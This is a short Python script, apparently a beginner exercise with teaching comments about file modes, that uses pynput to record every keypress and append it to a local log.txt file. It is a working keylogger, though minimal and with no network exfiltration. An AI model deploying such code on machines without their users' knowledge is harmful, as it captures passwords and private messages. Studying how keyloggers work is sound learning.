from pynput.keyboard import Listener

# it has to stores the keystrokes in a text file
# file handling - read, write and append

# r - reading
# w - writing
# a - appending to a file

# Listeners - Listen to keystrokes

if __name__ == '__main__':

    def write_to_file(key):
        keydata = str(key)

        # Closes the file automatically - Release memory
        with open("log.txt", "a") as f:
            f.write(keydata)
    
    with Listener(on_press=write_to_file) as listener:
        listener.join()